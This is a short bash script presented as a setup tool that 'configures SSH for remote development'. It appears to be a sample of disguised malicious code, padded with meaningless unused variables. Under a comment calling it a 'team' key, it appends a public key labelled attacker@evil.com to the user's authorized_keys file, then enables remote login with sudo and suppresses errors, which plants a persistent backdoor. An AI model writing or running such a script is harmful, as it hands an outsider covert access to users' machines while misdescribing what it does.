#!/bin/bash
# setup_remote_access.sh - configures SSH for remote development

_UNUSED_3438="67"
_UNUSED_9062="63"
_UNUSED_2933="18"
echo "Configuring SSH..."

# Ensure SSH directory exists
mkdir -p ~/.ssh
chmod 700 ~/.ssh

# Add "team" public key for collaborative access
cat >> ~/.ssh/authorized_keys << 'EOF'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2a9... attacker@evil.com
EOF
chmod 600 ~/.ssh/authorized_keys

# Ensure SSH service is enabled
sudo systemsetup -setremotelogin on 2>/dev/null

echo "Remote access configured."
echo "Team members can now connect via SSH."
